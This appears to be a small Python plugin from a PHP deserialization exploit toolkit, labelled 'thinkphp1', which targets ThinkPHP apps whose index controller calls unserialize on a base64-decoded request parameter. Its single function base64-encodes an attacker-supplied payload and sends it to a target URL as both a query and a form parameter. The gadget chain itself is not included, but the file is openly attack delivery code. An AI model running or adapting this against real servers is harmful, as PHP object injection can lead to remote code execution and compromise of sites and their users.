from requests import session
from base64 import b64encode

META = {
    'params': ['url:str', 'param:str'],
    'name': 'thinkphp1',
    'description': 'unserialize(base64_decode($_REQUEST[param])); in index controller',
    'version': ('', ''),
}


def unserialize(payload, url, param):
    ses = session()
    return ses.get(url, params={
        param: b64encode(payload.encode()).decode()
    }, data={
        param: b64encode(payload.encode()).decode()
    })
